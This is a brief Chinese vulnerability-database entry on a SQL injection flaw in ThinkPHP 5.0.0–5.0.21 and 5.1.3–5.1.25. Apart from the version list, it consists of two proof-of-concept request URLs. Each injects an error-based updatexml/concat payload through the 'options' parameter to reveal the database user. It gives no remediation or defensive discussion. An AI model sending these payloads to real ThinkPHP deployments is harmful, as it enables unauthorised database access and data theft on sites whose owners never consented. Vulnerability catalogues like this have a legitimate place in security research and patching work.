---
title: 'Thinkphp 5.0.(0-21)&5.1.(3-25)sql注入漏洞'
date: Wed, 07 Oct 2020 06:08:04 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞影响

5.0.0 <= ThinkPHP <= 5.0.21 5.1.3 <= ThinkPHP <= 5.1.25

### 漏洞POC

5.0.0~5.0.21 、 5.1.3～5.1.10

```
http://********/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 **
```

5.1.11～5.1.25

```
http://********/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 
```





